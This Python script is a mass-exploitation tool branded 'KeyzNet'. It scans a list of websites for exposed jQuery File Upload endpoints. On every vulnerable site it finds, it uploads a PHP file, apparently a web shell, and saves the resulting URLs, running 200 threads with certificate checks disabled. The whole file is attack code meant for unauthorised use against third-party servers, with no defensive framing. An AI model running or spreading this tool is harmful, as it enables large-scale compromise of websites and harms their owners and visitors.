import requests
import re
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from termcolor import colored

# Disable insecure request warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Enhanced print statements with ASCII art
ascii_art = r"""

  _  __            _  _     _   
 | |/ /___ _  _ __| \| |___| |_ 
 | ' </ -_) || |_ / .` / -_)  _|
 |_|\_\___|\_, /__|_|\_\___|\__|
           |__/                 
                                        
"""
print(colored(ascii_art, 'green', attrs=['bold']))
print("=" * 50)
print(colored("     AUTO UPLOAD JFU (./KeyzNet)", 'green', attrs=['bold']))
print(colored("========================================", 'green', attrs=['bold']))
print(colored(">> Contact Me: https://t.me/keyznet/ <<", 'cyan', attrs=['bold']))
print("=" * 50)

# Get file paths and URLs from user input
path_file = input("Masukan Path List: ")
with open(path_file, "r") as f:
    paths = f.readlines()

listpath = input("Masukan URL List: ")
urls = ["http://" + url.strip() for url in open(listpath, "r").readlines()]

def check_vulnerability(site):
    for path in paths:
        path = path.strip()
        try:
            response = requests.get(site + path, verify=False, timeout=10)
            if '{"files":[{"name":"' in response.text:
                print(colored(f"{site}{path} -> Vulnerable", 'green'))
                with open("vuln.txt", "a+") as vuln_file:
                    vuln_file.write(f"{site}{path}\n")
                
                # Attempt to upload file
                files = {"files[]": ("sample.php", open("sample.php", "rb"), "application/octet-stream")}
                upload_response = requests.post(site + path, files=files, verify=False, timeout=10)
                
                if upload_response.status_code == 200:
                    print(colored(f"{site}{path} -> File uploaded", 'green'))
                    match = re.search(r'"url":"(.*?)"', upload_response.text)
                    if match:
                        uploaded_url = match.group(1).replace('\\', '')
                        print(colored(f"Uploaded URL: {uploaded_url}", 'green'))
                        with open("hasil.txt", "a+") as upload_file:
                            upload_file.write(f"{uploaded_url}\n")
                else:
                    print(colored(f"{site}{path} -> Upload failed", 'red'))
            else:
                print(colored(f"{site}{path} -> Not Vulnerable", 'red'))
        except Exception as e:
            print(colored(f"{site}{path} -> Error: {str(e)}", 'yellow'))

# Use a thread pool to check URLs concurrently
with Pool(200) as pool:
    pool.map(check_vulnerability, urls)
